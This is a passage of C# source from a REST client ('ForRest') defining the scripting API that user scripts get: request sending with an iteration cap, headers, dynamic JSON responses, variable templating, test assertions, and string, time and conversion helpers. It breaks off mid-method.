using System.Globalization;
using System.Collections;
using System.Dynamic;
using System.Linq.Expressions;
using System.Security.Cryptography;
using System.Threading;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using ForRest.Domain;
using ForRest.Models;

namespace ForRest.Scripting;

public sealed class ScriptRequestApi
{
    #region Constructors

    public ScriptRequestApi(
        PreparedRequest request,
        ScriptResponseApi responseApi,
        VariablesApi variablesApi,
        Func<PreparedRequest, Task<ResponseSnapshot?>>? sendAsync = null,
        int maxSendIterations = 0)
    {
        originalRequest = request;
        this.responseApi = responseApi;
        this.variablesApi = variablesApi;
        this.sendAsync = sendAsync;
        this.maxSendIterations = Math.Max(0, maxSendIterations);
        Method = request.Method.ToString().ToUpperInvariant();
        Url = request.Uri.ToString();
        Body = request.Body.RawContent;
        ContentType = request.Body.ContentType;
        UserAgent = request.UserAgent.ToString();
        CustomUserAgent = request.CustomUserAgent;
        Headers = new ScriptHeaderCollection(request.Headers);
    }

    #endregion

    #region Properties

    private readonly PreparedRequest originalRequest;

    private readonly ScriptResponseApi responseApi;

    private readonly VariablesApi variablesApi;

    private readonly Func<PreparedRequest, Task<ResponseSnapshot?>>? sendAsync;

    private readonly int maxSendIterations;

    private int sendCount;

    private ResponseSnapshot? lastSentResponse;

    private readonly List<ResponseSnapshot> sentResponses = [];

    private readonly List<RequestSnapshot> sentRequests = [];

    public string Method { get; set; }

    public string Url { get; set; }

    public string Body { get; set; }

    public string ContentType { get; set; }

    public string UserAgent { get; set; }

    public string CustomUserAgent { get; set; }

    public ScriptHeaderCollection Headers { get; }

    public int MaxSendIterations => maxSendIterations;

    public int RemainingSendIterations => Math.Max(0, maxSendIterations - sendCount);

    public int SendCount => Volatile.Read(ref sendCount);

    public ResponseSnapshot? LastSentResponse => lastSentResponse;

    public IReadOnlyList<ResponseSnapshot> SentResponses
    {
        get
        {
            lock (sentResponses)
            {
                return [.. sentResponses];
            }
        }
    }

    public IReadOnlyList<RequestSnapshot> SentRequests
    {
        get
        {
            lock (sentRequests)
            {
                return [.. sentRequests];
            }
        }
    }

    #endregion

    #region Public Methods

    public void SetHeader(string key, string value)
    {
        Headers[key] = value;
    }

    public void AddHeader(string key, string value)
    {
        Headers.Add(key, value);
    }

    public void RemoveHeader(string key)
    {
        Headers.Remove(key);
    }

    public Task<dynamic> send()
    {
        return SendAsync();
    }

    public async Task<dynamic> SendAsync()
    {
        return await SendAsyncCore(null);
    }

    public async Task<dynamic> SendAsync(string? label)
    {
        return await SendAsyncCore(label);
    }

    public ScriptRequestApi Clone()
    {
        var clonedResponse = new ScriptResponseApi(null);
        var clone = new ScriptRequestApi(
            originalRequest,
            clonedResponse,
            variablesApi,
            sendAsync,
            maxSendIterations)
        {
            Method = Method,
            Url = Url,
            Body = Body,
            ContentType = ContentType,
            UserAgent = UserAgent,
            CustomUserAgent = CustomUserAgent,
        };

        foreach (var header in Headers.All())
        {
            clone.Headers[header.Key] = header.Value;
        }

        return clone;
    }

    private async Task<dynamic> SendAsyncCore(string? label)
    {
        if (sendAsync is null || maxSendIterations <= 0)
        {
            throw new InvalidOperationException("request.send() is disabled for this request. Increase max_send_iterations to enable it.");
        }

        var preparedRequest = ToPreparedRequest();
        RequestSnapshot requestSnapshot = PreparedRequestSnapshotBuilder.Build(preparedRequest);
        var nextSendCount = Interlocked.Increment(ref sendCount);
        if (nextSendCount > maxSendIterations)
        {
            throw new InvalidOperationException($"request.send() exceeded max_send_iterations ({maxSendIterations}).");
        }

        ResponseSnapshot? response = await sendAsync(preparedRequest);
        if (response is not null && !string.IsNullOrWhiteSpace(label))
        {
            response = response with { Label = label };
        }

        lastSentResponse = response;
        if (response is not null)
        {
            lock (sentResponses)
            {
                sentResponses.Add(response);
            }

            lock (sentRequests)
            {
                sentRequests.Add(requestSnapshot);
            }
        }

        responseApi.Update(response);
        return new ScriptResponseApi(response);
    }

    public PreparedRequest ToPreparedRequest()
    {
        var method = Enum.TryParse<HttpMethodKind>(Method, true, out var parsedMethod)
            ? parsedMethod
            : originalRequest.Method;

        string renderedUrl = variablesApi.RenderTemplate(Url);
        string renderedBody = variablesApi.RenderTemplate(Body);
        string renderedContentType = variablesApi.RenderTemplate(ContentType);
        List<KeyValueDefinition> renderedHeaders =
        [
            .. Headers.All().Select(
                item => new KeyValueDefinition
                {
                    Key = variablesApi.RenderTemplate(item.Key),
                    Value = variablesApi.RenderTemplate(item.Value),
                }),
        ];
        var bodyMode = string.IsNullOrWhiteSpace(Body)
            ? RequestBodyMode.None
            : originalRequest.Body.Mode == RequestBodyMode.None
                ? RequestBodyMode.RawText
                : originalRequest.Body.Mode;

        if (!Uri.TryCreate(renderedUrl, UriKind.Absolute, out var uri))
        {
            throw new InvalidOperationException($"request.Url must be a valid absolute URL. Received '{renderedUrl}'.");
        }

        RequestBodyDefinition renderedBodyDefinition = originalRequest.Body with
        {
            Mode = bodyMode,
            RawContent = renderedBody,
            ContentType = renderedContentType,
        };

        return originalRequest with
        {
            Method = method,
            Uri = uri,
            Headers = renderedHeaders,
            Body = renderedBodyDefinition,
            RawRequest = BuildRawRequest(method, uri, renderedHeaders, renderedBodyDefinition),
        };
    }

    #endregion

    #region Private Methods

    private static string BuildRawRequest(
        HttpMethodKind method,
        Uri uri,
        IEnumerable<KeyValueDefinition> headers,
        RequestBodyDefinition body)
    {
        StringBuilder builder = new();
        builder.Append(method.ToString().ToUpperInvariant());
        builder.Append(' ');
        builder.Append(uri);
        builder.AppendLine();

        foreach (KeyValueDefinition header in headers.Where(static item => item.IsEnabled))
        {
            builder.Append(header.Key);
            builder.Append(": ");
            builder.AppendLine(header.Value);
        }

        if (body.Mode != RequestBodyMode.None)
        {
            builder.AppendLine();
            if (body.Mode is RequestBodyMode.FormUrlEncoded or RequestBodyMode.MultipartFormData)
            {
                builder.AppendLine(string.Join("&", body.FormValues.Where(static item => item.IsEnabled).Select(static item => $"{item.Key}={item.Value}")));
            }
            else
            {
                builder.AppendLine(body.RawContent);
            }
        }

        return builder.ToString().TrimEnd();
    }

    #endregion
}

public sealed class ScriptHeaderCollection : IEnumerable<KeyValuePair<string, string>>
{
    private readonly List<KeyValueDefinition> headers = [];

    public ScriptHeaderCollection(IEnumerable<KeyValueDefinition> seedHeaders)
    {
        foreach (KeyValueDefinition header in seedHeaders.Where(static header => header.IsEnabled && !string.IsNullOrWhiteSpace(header.Key)))
        {
            headers.Add(header);
        }
    }

    public string this[string key]
    {
        get => headers.LastOrDefault(header => string.Equals(header.Key, key, StringComparison.OrdinalIgnoreCase))?.Value ?? string.Empty;
        set
        {
            Remove(key);
            Add(key, value);
        }
    }

    public void Add(string key, string value)
    {
        if (string.IsNullOrWhiteSpace(key))
        {
            throw new InvalidOperationException("Header names cannot be empty.");
        }

        headers.Add(
            new()
            {
                Key = key,
                Value = value ?? string.Empty,
            });
    }

    public void Remove(string key)
    {
        headers.RemoveAll(header => string.Equals(header.Key, key, StringComparison.OrdinalIgnoreCase));
    }

    public IReadOnlyList<KeyValueDefinition> All()
    {
        return headers.ToList();
    }

    public IEnumerator<KeyValuePair<string, string>> GetEnumerator()
    {
        return headers
            .Select(static header => new KeyValuePair<string, string>(header.Key, header.Value))
            .GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator()
    {
        return GetEnumerator();
    }
}

public sealed class ScriptResponseApi(ResponseSnapshot? initialResponse) : DynamicObject, IEnumerable<object?>
{
    #region Properties

    private ResponseSnapshot? response = initialResponse;

    private JsonNode? parsedJson;

    private bool jsonParsed;

    public int Status => response?.StatusCode ?? 0;

    public string Body => response?.Body ?? string.Empty;

    public string ContentType => response?.ContentType ?? string.Empty;

    public Dictionary<string, string> Headers => BuildHeaders(response);

    public ResponseSnapshot? Snapshot => response;

    #endregion

    #region Public Methods

    public void Update(ResponseSnapshot? nextResponse)
    {
        response = nextResponse;
        parsedJson = null;
        jsonParsed = false;
    }

    public JsonNode? Json()
    {
        if (jsonParsed)
        {
            return parsedJson;
        }

        jsonParsed = true;
        if (string.IsNullOrWhiteSpace(response?.Body))
        {
            parsedJson = null;
            return parsedJson;
        }

        try
        {
            parsedJson = JsonNode.Parse(response.Body);
        }
        catch (JsonException)
        {
            parsedJson = null;
        }

        return parsedJson;
    }

    public override bool TryGetMember(GetMemberBinder binder, out object? result)
    {
        switch (NormalizeMemberName(binder.Name))
        {
            case "status":
                result = Status;
                return true;
            case "body":
                result = Body;
                return true;
            case "contenttype":
                result = ContentType;
                return true;
            case "headers":
                result = Headers;
                return true;
        }

        if (Json() is JsonObject jsonObject && DynamicJsonObject.TryResolveMember(jsonObject, binder.Name, out result))
        {
            return true;
        }

        result = DynamicJsonNull.Instance;
        return true;
    }

    public override bool TryGetIndex(GetIndexBinder binder, object?[] indexes, out object? result)
    {
        if (indexes.Length != 1)
        {
            result = null;
            return true;
        }

        JsonNode? node = Json();
        switch (node)
        {
            case JsonObject jsonObject when indexes[0] is string key:
                return DynamicJsonObject.TryResolveMember(jsonObject, key, out result);
            case JsonArray jsonArray when TryConvertIndex(indexes[0], out int index) && index >= 0 && index < jsonArray.Count:
                result = DynamicJsonObject.Wrap(jsonArray[index]);
                return true;
            default:
                result = DynamicJsonNull.Instance;
                return true;
        }
    }

    public override IEnumerable<string> GetDynamicMemberNames()
    {
        if (Json() is not JsonObject jsonObject)
        {
            return [];
        }

        return jsonObject.Select(static item => item.Key);
    }

    public IEnumerator<object?> GetEnumerator()
    {
        return Json() is JsonArray jsonArray
            ? jsonArray.Select(DynamicJsonObject.Wrap).GetEnumerator()
            : Enumerable.Empty<object?>().GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator()
    {
        return GetEnumerator();
    }

    #endregion

    #region Private Methods

    private static bool TryConvertIndex(object? value, out int index)
    {
        switch (value)
        {
            case int intValue:
                index = intValue;
                return true;
            case long longValue when longValue >= int.MinValue && longValue <= int.MaxValue:
                index = (int)longValue;
                return true;
            default:
                index = -1;
                return false;
        }
    }

    private static Dictionary<string, string> BuildHeaders(ResponseSnapshot? response)
    {
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        if (response is null)
        {
            return headers;
        }

        foreach (var header in response.Headers)
        {
            if (string.IsNullOrWhiteSpace(header.Key))
            {
                continue;
            }

            headers[header.Key] = header.Value;
        }

        return headers;
    }

    private static string NormalizeMemberName(string value)
    {
        if (string.IsNullOrWhiteSpace(value))
        {
            return string.Empty;
        }

        // Old impl: `new string(value.Where(...).ToArray()).ToLowerInvariant()` —
        // a LINQ enumerator + char[] + string + a second lowercased string per call.
        // Now: a single allocation sized at most to the source length, lowercased
        // in the same pass.
        var builder = new StringBuilder(value.Length);
        foreach (char character in value)
        {
            if (char.IsLetterOrDigit(character))
            {
                builder.Append(char.ToLowerInvariant(character));
            }
        }

        return builder.ToString();
    }

    #endregion
}

internal sealed class DynamicJsonNull : DynamicObject, IEnumerable<object?>
{
    public static DynamicJsonNull Instance { get; } = new();

    private DynamicJsonNull()
    {
    }

    public override bool TryGetMember(GetMemberBinder binder, out object? result)
    {
        result = this;
        return true;
    }

    public override bool TryGetIndex(GetIndexBinder binder, object?[] indexes, out object? result)
    {
        result = this;
        return true;
    }

    public override bool TryInvokeMember(InvokeMemberBinder binder, object[] args, out object? result)
    {
        result = this;
        return true;
    }

    public override bool TryUnaryOperation(UnaryOperationBinder binder, out object? result)
    {
        switch (binder.Operation)
        {
            case ExpressionType.IsTrue:
                result = false;
                return true;
            case ExpressionType.IsFalse:
            case ExpressionType.Not:
                result = true;
                return true;
            default:
                result = this;
                return true;
        }
    }

    public override bool TryBinaryOperation(BinaryOperationBinder binder, object? arg, out object? result)
    {
        switch (binder.Operation)
        {
            case ExpressionType.Equal:
                result = arg is null or DynamicJsonNull;
                return true;
            case ExpressionType.NotEqual:
                result = arg is not null && arg is not DynamicJsonNull;
                return true;
            case ExpressionType.GreaterThan:
            case ExpressionType.GreaterThanOrEqual:
            case ExpressionType.LessThan:
            case ExpressionType.LessThanOrEqual:
                result = false;
                return true;
            default:
                result = this;
                return true;
        }
    }

    public override bool TryConvert(ConvertBinder binder, out object? result)
    {
        Type targetType = Nullable.GetUnderlyingType(binder.Type) ?? binder.Type;

        if (targetType == typeof(string))
        {
            result = null;
            return true;
        }

        if (targetType == typeof(bool))
        {
            result = false;
            return true;
        }

        if (targetType == typeof(int))
        {
            result = 0;
            return true;
        }

        if (targetType == typeof(long))
        {
            result = 0L;
            return true;
        }

        if (targetType == typeof(float))
        {
            result = 0f;
            return true;
        }

        if (targetType == typeof(double))
        {
            result = 0d;
            return true;
        }

        if (targetType == typeof(decimal))
        {
            result = 0m;
            return true;
        }

        if (targetType == typeof(JsonNode) || targetType == typeof(object) || !targetType.IsValueType)
        {
            result = null;
            return true;
        }

        result = Activator.CreateInstance(targetType);
        return true;
    }

    public override IEnumerable<string> GetDynamicMemberNames()
    {
        return [];
    }

    public IEnumerator<object?> GetEnumerator()
    {
        return Enumerable.Empty<object?>().GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator()
    {
        return GetEnumerator();
    }

    public override bool Equals(object? obj)
    {
        return obj is null or DynamicJsonNull;
    }

    public override int GetHashCode()
    {
        return 0;
    }

    public override string ToString()
    {
        return string.Empty;
    }

    public static bool operator ==(DynamicJsonNull? left, object? right)
    {
        return right is null || right is DynamicJsonNull;
    }

    public static bool operator !=(DynamicJsonNull? left, object? right)
    {
        return !(left == right);
    }

    public static implicit operator string?(DynamicJsonNull? value)
    {
        return null;
    }

    public static implicit operator bool(DynamicJsonNull? value)
    {
        return false;
    }
}

internal sealed class DynamicJsonObject(JsonObject source) : DynamicObject
{
    public override bool TryGetMember(GetMemberBinder binder, out object? result)
    {
        return TryResolveMember(source, binder.Name, out result);
    }

    public override bool TryGetIndex(GetIndexBinder binder, object?[] indexes, out object? result)
    {
        if (indexes.Length == 1 && indexes[0] is string key)
        {
            return TryResolveMember(source, key, out result);
        }

        result = null;
        return true;
    }

    public override IEnumerable<string> GetDynamicMemberNames()
    {
        return source.Select(static item => item.Key);
    }

    public static bool TryResolveMember(JsonObject source, string memberName, out object? result)
    {
        if (TryResolveNode(source, memberName, out JsonNode? node))
        {
            result = Wrap(node);
            return true;
        }

        result = DynamicJsonNull.Instance;
        return true;
    }

    private static bool TryResolveNode(JsonObject source, string memberName, out JsonNode? node)
    {
        if (source.TryGetPropertyValue(memberName, out node))
        {
            return true;
        }

        string normalizedMemberName = NormalizeMemberName(memberName);
        foreach (KeyValuePair<string, JsonNode?> property in source)
        {
            if (string.Equals(property.Key, memberName, StringComparison.OrdinalIgnoreCase)
                || string.Equals(NormalizeMemberName(property.Key), normalizedMemberName, StringComparison.OrdinalIgnoreCase))
            {
                node = property.Value;
                return true;
            }
        }

        node = null;
        return false;
    }

    internal static object? Wrap(JsonNode? node)
    {
        return node switch
        {
            null => DynamicJsonNull.Instance,
            JsonObject jsonObject => new DynamicJsonObject(jsonObject),
            JsonArray jsonArray => jsonArray.Select(Wrap).ToList(),
            JsonValue jsonValue => UnwrapScalar(jsonValue),
            _ => node.ToJsonString(),
        };
    }

    private static object? UnwrapScalar(JsonValue value)
    {
        if (value.TryGetValue<string>(out var stringValue))
        {
            return stringValue;
        }

        if (value.TryGetValue<bool>(out var boolValue))
        {
            return boolValue;
        }

        if (value.TryGetValue<int>(out var intValue))
        {
            return intValue;
        }

        if (value.TryGetValue<long>(out var longValue))
        {
            return longValue;
        }

        if (value.TryGetValue<decimal>(out var decimalValue))
        {
            return decimalValue;
        }

        if (value.TryGetValue<double>(out var doubleValue))
        {
            return doubleValue;
        }

        return value.ToJsonString().Trim('"');
    }

    private static string NormalizeMemberName(string value)
    {
        if (string.IsNullOrWhiteSpace(value))
        {
            return string.Empty;
        }

        return new string(value.Where(static character => char.IsLetterOrDigit(character)).ToArray());
    }
}

public sealed class VariablesApi(IEnumerable<VariableDefinition> seedVariables)
{
    #region Private Fields

    private static readonly Regex VariableTokenPattern = new(@"\{\{(?<key>[\w\.\-]+)\}\}|\$\{(?<key>[\w\.\-]+)\}", RegexOptions.Compiled);

    private readonly Dictionary<string, VariableDefinition> variables = BuildVariableMap(seedVariables);

    #endregion

    #region Public Methods

    public string Get(string key, string defaultValue = "")
    {
        return variables.TryGetValue(key, out var variable) ? variable.Value : defaultValue;
    }

    public void Set(string key, string value, VariableScope scope = VariableScope.Runtime, bool isSecret = false)
    {
        variables[key] = new()
        {
            Key = key,
            Value = value,
            Scope = scope,
            IsSecret = isSecret,
        };
    }

    public IReadOnlyCollection<VariableDefinition> All()
    {
        return variables.Values.ToList();
    }

    public IReadOnlyList<VariableDefinition> RuntimeVariables()
    {
        return
        [
            .. variables.Values
                .Where(static item => item.Scope == VariableScope.Runtime)
                .OrderBy(static item => item.Key, StringComparer.OrdinalIgnoreCase),
        ];
    }

    public void MergeRuntimeVariables(IEnumerable<VariableDefinition> runtimeVariables)
    {
        foreach (VariableDefinition variable in runtimeVariables.Where(static item => item.Scope == VariableScope.Runtime))
        {
            variables[variable.Key] = variable with
            {
                Scope = VariableScope.Runtime,
            };
        }
    }

    public void ClearRuntimeNamespace(string key)
    {
        if (string.IsNullOrWhiteSpace(key))
        {
            return;
        }

        List<string> keysToRemove =
        [
            .. variables
                .Where(
                    item => item.Value.Scope == VariableScope.Runtime
                            && (string.Equals(item.Key, key, StringComparison.OrdinalIgnoreCase)
                                || item.Key.StartsWith($"{key}.", StringComparison.OrdinalIgnoreCase)))
                .Select(static item => item.Key),
        ];

        foreach (string existingKey in keysToRemove)
        {
            variables.Remove(existingKey);
        }
    }

    public string RenderTemplate(string template)
    {
        return VariableTokenPattern.Replace(
            template ?? string.Empty,
            match =>
            {
                string key = match.Groups["key"].Value;
                return variables.TryGetValue(key, out VariableDefinition? variable)
                    ? variable.Value ?? string.Empty
                    : match.Value;
            });
    }

    #endregion

    #region Private Methods

    private static Dictionary<string, VariableDefinition> BuildVariableMap(IEnumerable<VariableDefinition> seedVariables)
    {
        var variables = new Dictionary<string, VariableDefinition>(StringComparer.OrdinalIgnoreCase);
        foreach (var variable in seedVariables)
        {
            if (string.IsNullOrWhiteSpace(variable.Key))
            {
                continue;
            }

            variables[variable.Key] = variable;
        }

        return variables;
    }

    #endregion
}

public sealed class TestsApi
{
    #region Private Fields

    private readonly List<TestResult> testResults = [];

    #endregion

    #region Public Methods

    public IReadOnlyList<TestResult> All()
    {
        return testResults;
    }

    public void Assert(bool condition, string message)
    {
        testResults.Add(new()
        {
            Name = message,
            Message = message,
            State = condition ? TestOutcomeState.Passed : TestOutcomeState.Failed,
        });

        if (!condition)
        {
            throw new InvalidOperationException(message);
        }
    }

    public void Equal<T>(T expected, T actual, string message)
    {
        var success = EqualityComparer<T>.Default.Equals(expected, actual);
        Assert(success, success ? message : $"{message} Expected '{expected}', received '{actual}'.");
    }

    public void Fail(string message)
    {
        Assert(false, message);
    }

    public void Pass(string message)
    {
        testResults.Add(new()
        {
            Name = message,
            Message = message,
            State = TestOutcomeState.Passed,
        });
    }

    public void Import(IEnumerable<TestResult> results)
    {
        testResults.AddRange(results);
    }

    #endregion
}

public sealed class ConsoleApi
{
    #region Private Fields

    private readonly List<ConsoleEntry> entries = [];

    #endregion

    #region Public Methods

    public IReadOnlyList<ConsoleEntry> All()
    {
        return entries;
    }

    public void Log(object? value)
    {
        Add(ConsoleEntryLevel.Info, value);
    }

    public void Warn(object? value)
    {
        Add(ConsoleEntryLevel.Warning, value);
    }

    public void Error(object? value)
    {
        Add(ConsoleEntryLevel.Error, value);
    }

    public void Import(IEnumerable<ConsoleEntry> entriesToImport)
    {
        entries.AddRange(entriesToImport);
    }

    #endregion

    #region Private Methods

    private void Add(ConsoleEntryLevel level, object? value)
    {
        entries.Add(new()
        {
            Level = level,
            Message = value?.ToString() ?? string.Empty,
        });
    }

    #endregion
}

public sealed class StashApi : DynamicObject
{
    private readonly List<StashRow> rows = [];
    private readonly Dictionary<string, string> pendingValues = new(StringComparer.OrdinalIgnoreCase);
    private readonly List<string> columns = [];

    public void Set(string key, object? value)
    {
        string normalizedKey = NormalizeKey(key);
        if (string.IsNullOrWhiteSpace(normalizedKey))
        {
            throw new InvalidOperationException("stash column names cannot be empty.");
        }

        RegisterColumn(normalizedKey);
        pendingValues[normalizedKey] = ConvertToCellValue(value);
    }

    public void Add(string key, object? value)
    {
        Set(key, value);
    }

    public void Commit()
    {
        if (pendingValues.Count == 0)
        {
            return;
        }

        rows.Add(
            new()
            {
                Values = pendingValues.ToDictionary(static item => item.Key, static item => item.Value, StringComparer.OrdinalIgnoreCase),
            });

        pendingValues.Clear();
    }

    public void Push()
    {
        Commit();
    }

    public void ClearPending()
    {
        pendingValues.Clear();
    }

    public void Reset()
    {
        rows.Clear();
        pendingValues.Clear();
        columns.Clear();
    }

    public StashTable BuildTable()
    {
        List<StashRow> snapshotRows = [.. rows];
        if (pendingValues.Count > 0)
        {
            snapshotRows.Add(
                new()
                {
                    Values = pendingValues.ToDictionary(static item => item.Key, static item => item.Value, StringComparer.OrdinalIgnoreCase),
                });
        }

        return new()
        {
            Columns = [.. columns],
            Rows = snapshotRows,
        };
    }

    public void Import(StashTable table)
    {
        foreach (string column in table.Columns)
        {
            string normalizedColumn = NormalizeKey(column);
            if (string.IsNullOrWhiteSpace(normalizedColumn))
            {
                continue;
            }

            RegisterColumn(normalizedColumn);
        }

        foreach (StashRow row in table.Rows)
        {
            rows.Add(
                new()
                {
                    Values = row.Values.ToDictionary(static item => item.Key, static item => item.Value, StringComparer.OrdinalIgnoreCase),
                });
        }
    }

    public override bool TrySetMember(SetMemberBinder binder, object? value)
    {
        Set(binder.Name, value);
        return true;
    }

    public override bool TryGetMember(GetMemberBinder binder, out object? result)
    {
        result = pendingValues.TryGetValue(binder.Name, out string? value) ? value : string.Empty;
        return true;
    }

    public override bool TrySetIndex(SetIndexBinder binder, object?[] indexes, object? value)
    {
        if (indexes.Length == 1 && indexes[0] is string key)
        {
            Set(key, value);
            return true;
        }

        return base.TrySetIndex(binder, indexes, value);
    }

    public override bool TryGetIndex(GetIndexBinder binder, object?[] indexes, out object? result)
    {
        if (indexes.Length == 1 && indexes[0] is string key)
        {
            result = pendingValues.TryGetValue(key, out string? value) ? value : string.Empty;
            return true;
        }

        result = null;
        return false;
    }

    public void DeclareColumns(params string[] declaredColumns)
    {
        foreach (var column in declaredColumns)
        {
            string normalized = NormalizeKey(column);
            if (!string.IsNullOrWhiteSpace(normalized))
            {
                RegisterColumn(normalized);
            }
        }
    }

    private void RegisterColumn(string key)
    {
        if (columns.Any(existing => string.Equals(existing, key, StringComparison.OrdinalIgnoreCase)))
        {
            return;
        }

        columns.Add(key);
    }

    private static string NormalizeKey(string? key)
    {
        return (key ?? string.Empty).Trim();
    }

    private static string ConvertToCellValue(object? value)
    {
        return value switch
        {
            null => string.Empty,
            string stringValue => stringValue,
            bool boolValue => boolValue ? "true" : "false",
            JsonNode jsonNode => jsonNode.ToJsonString(),
            IFormattable formattable => formattable.ToString(null, CultureInfo.InvariantCulture) ?? string.Empty,
            _ => value.ToString() ?? string.Empty,
        };
    }
}

public sealed class SnapshotApi
{
    private readonly Dictionary<string, object> snapshots = new(StringComparer.OrdinalIgnoreCase);

    public async Task Save(string name, object? source)
    {
        if (string.IsNullOrWhiteSpace(name))
        {
            throw new InvalidOperationException("snapshot name cannot be empty.");
        }

        if (source is not null)
        {
            snapshots[name] = source;
        }

        await Task.CompletedTask;
    }

    public object? Get(string name)
    {
        return snapshots.TryGetValue(name, out var value) ? value : null;
    }

    public IReadOnlyDictionary<string, object> All()
    {
        return snapshots;
    }
}

public sealed class TimeApi
{
    public DateTimeOffset UtcNow => DateTimeOffset.UtcNow;

    public DateTimeOffset Now => DateTimeOffset.Now;

    public DateTimeOffset Parse(string value)
    {
        if (string.IsNullOrWhiteSpace(value))
        {
            throw new InvalidOperationException("time.Parse() requires a date or timestamp value.");
        }

        if (DateTimeOffset.TryParse(
                value,
                CultureInfo.InvariantCulture,
                DateTimeStyles.AllowWhiteSpaces | DateTimeStyles.RoundtripKind | DateTimeStyles.AssumeUniversal,
                out DateTimeOffset parsed))
        {
            return parsed;
        }

        throw new InvalidOperationException($"time.Parse() could not parse '{value}'.");
    }

    public string Format(DateTimeOffset value, string format = "O")
    {
        return value.ToString(string.IsNullOrWhiteSpace(format) ? "O" : format, CultureInfo.InvariantCulture);
    }

    public DateTimeOffset AddDays(DateTimeOffset value, double days)
    {
        return value.AddDays(days);
    }

    public DateTimeOffset AddHours(DateTimeOffset value, double hours)
    {
        return value.AddHours(hours);
    }

    public DateTimeOffset AddMinutes(DateTimeOffset value, double minutes)
    {
        return value.AddMinutes(minutes);
    }

    public DateTimeOffset AddSeconds(DateTimeOffset value, double seconds)
    {
        return value.AddSeconds(seconds);
    }

    public long UnixSeconds(DateTimeOffset value)
    {
        return value.ToUnixTimeSeconds();
    }

    public long UnixMilliseconds(DateTimeOffset value)
    {
        return value.ToUnixTimeMilliseconds();
    }

    public DateTimeOffset FromUnixSeconds(long value)
    {
        return DateTimeOffset.FromUnixTimeSeconds(value);
    }

    public DateTimeOffset FromUnixMilliseconds(long value)
    {
        return DateTimeOffset.FromUnixTimeMilliseconds(value);
    }
}

public sealed class StringsApi
{
    public int Length(string? value)
    {
        return value?.Length ?? 0;
    }

    public string Trim(string? value)
    {
        return value?.Trim() ?? string.Empty;
    }

    public string TrimStart(string? value)
    {
        return value?.TrimStart() ?? string.Empty;
    }

    public string TrimEnd(string? value)
    {
        return value?.TrimEnd() ?? string.Empty;
    }

    public string Upper(string? value)
    {
        return (value ?? string.Empty).ToUpperInvariant();
    }

    public string Lower(string? value)
    {
        return (value ?? string.Empty).ToLowerInvariant();
    }

    public bool Contains(string? value, string? search, bool ignoreCase = false)
    {
        return (value ?? string.Empty).IndexOf(search ?? string.Empty, GetComparison(ignoreCase)) >= 0;
    }

    public bool StartsWith(string? value, string? prefix, bool ignoreCase = false)
    {
        return (value ?? string.Empty).StartsWith(prefix ?? string.Empty, GetComparison(ignoreCase));
    }

    public bool EndsWith(string? value, string? suffix, bool ignoreCase = false)
    {
        return (value ?? string.Empty).EndsWith(suffix ?? string.Empty, GetComparison(ignoreCase));
    }

    public string Replace(string? value, string? oldValue, string? newValue, bool ignoreCase = false)
    {
        string text = value ?? string.Empty;
        if (string.IsNullOrEmpty(oldValue))
        {
            return text;
        }

        string replacement = newValue ?? string.Empty;
        if (!ignoreCase)
        {
            return text.Replace(oldValue, replacement, StringComparison.Ordinal);
        }

        return Regex.Replace(
            text,
            Regex.Escape(oldValue),
            _ => replacement,
            RegexOptions.CultureInvariant | RegexOptions.IgnoreCase);
    }

    public string Substring(string? value, int startIndex)
    {
        string text = value ?? string.Empty;
        if (text.Length == 0)
        {
            return string.Empty;
        }

        int safeStartIndex = Math.Clamp(startIndex, 0, text.Length);
        return safeStartIndex >= text.Length ? string.Empty : text[safeStartIndex..];
    }

    public string Substring(string? value, int startIndex, int length)
    {
        string text = value ?? string.Empty;
        if (text.Length == 0 || length <= 0)
        {
            return string.Empty;
        }

        int safeStartIndex = Math.Clamp(startIndex, 0, text.Length);
        if (safeStartIndex >= text.Length)
        {
            return string.Empty;
        }

        int safeLength = Math.Min(length, text.Length - safeStartIndex);
        return safeLength <= 0 ? string.Empty : text.Substring(safeStartIndex, safeLength);
    }

    public IReadOnlyList<string> Split(string? value, string? separator, bool removeEmpty = false)
    {
        string text = value ?? string.Empty;
        if (string.IsNullOrEmpty(separator))
        {
            return [text];
        }

        StringSplitOptions options = removeEmpty ? StringSplitOptions.RemoveEmptyEntries : StringSplitOptions.None;
        return [.. text.Split([separator], options)];
    }

    public string Join(string? separator, IEnumerable? values)
    {
        if (values is null)
        {
            return string.Empty;
        }

        if (values is string text)
        {
            return text;
        }

        return string.Join(
            separator ?? string.Empty,
            values.Cast<object?>().Select(ConvertApi.FormatValue));
    }

    private static StringComparison GetComparison(bool ignoreCase)
    {
        return ignoreCase ? StringComparison.OrdinalIgnoreCase : StringComparison.Ordinal;
    }
}

public sealed class ConvertApi
{
    public string ToString(object? value, string fallback = "")
    {
        return value is null ? fallback ?? string.Empty : FormatValue(value);
    }

    public int ToInt(object? value, int fallback = 0)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => fallback,
            int intValue => intValue,
            long longValue when longValue is >= int.MinValue and <= int.MaxValue => (int)longValue,
            decimal decimalValue when decimalValue is >= int.MinValue and <= int.MaxValue => (int)decimal.Truncate(decimalValue),
            double doubleValue when double.IsFinite(doubleValue) && doubleValue >= int.MinValue && doubleValue <= int.MaxValue => (int)Math.Truncate(doubleValue),
            bool boolValue => boolValue ? 1 : 0,
            string stringValue when int.TryParse(stringValue, NumberStyles.Integer, CultureInfo.InvariantCulture, out int parsedIntValue) => parsedIntValue,
            string stringValue when long.TryParse(stringValue, NumberStyles.Integer, CultureInfo.InvariantCulture, out long parsedLongValue) && parsedLongValue is >= int.MinValue and <= int.MaxValue => (int)parsedLongValue,
            string stringValue when decimal.TryParse(stringValue, NumberStyles.Number, CultureInfo.InvariantCulture, out decimal parsedDecimalValue) && parsedDecimalValue is >= int.MinValue and <= int.MaxValue => (int)decimal.Truncate(parsedDecimalValue),
            _ => fallback,
        };
    }

    public long ToLong(object? value, long fallback = 0)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => fallback,
            long longValue => longValue,
            int intValue => intValue,
            decimal decimalValue when decimalValue is >= long.MinValue and <= long.MaxValue => (long)decimal.Truncate(decimalValue),
            double doubleValue when double.IsFinite(doubleValue) && doubleValue >= long.MinValue && doubleValue <= long.MaxValue => (long)Math.Truncate(doubleValue),
            bool boolValue => boolValue ? 1L : 0L,
